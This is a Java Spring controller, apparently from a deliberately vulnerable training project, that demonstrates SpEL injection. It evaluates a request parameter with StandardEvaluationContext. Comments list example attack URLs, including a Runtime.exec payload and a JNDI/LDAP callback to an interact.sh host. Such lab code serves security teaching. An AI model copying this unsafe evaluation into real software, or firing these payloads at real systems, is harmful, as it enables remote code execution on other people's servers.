package com.ffffffff0x.exploit;

import lombok.extern.slf4j.Slf4j;
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.SpelParseException;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.net.MalformedURLException;
import java.net.URL;

@Slf4j
@RestController
public class SpEL {

    // spel 注入
    // http://127.0.0.1:8777/spel?exec=1
    // http://127.0.0.1:8777/spel?exec=T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22)
    // http://127.0.0.1:8777/spel?exec=${jndi:ldap://c8jrsjp2vtc0000rwce0grjcc3oyyyyyb.interact.sh}
    @RequestMapping("/spel")
    public String vul(String exec) {
        // 1. 创建解析器：SpEL使用ExpressionParser接口表示解析器，提供SpelExpressionParser默认实现
        ExpressionParser parser = new SpelExpressionParser();
        // StandardEvaluationContext权限过大，可以执行任意代码
        EvaluationContext evaluationContext = new StandardEvaluationContext();

        // 2. 解析表达式: 使用ExpressionParser的parseExpression来解析相应的表达式为Expression对象
        // 3. 求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值

        String result = "";
        try {
            result = parser.parseExpression(exec).getValue(evaluationContext).toString();
            log.info(exec);

        } catch (SpelParseException e) {
            log.error(exec);
        }
        return result;
    }

}
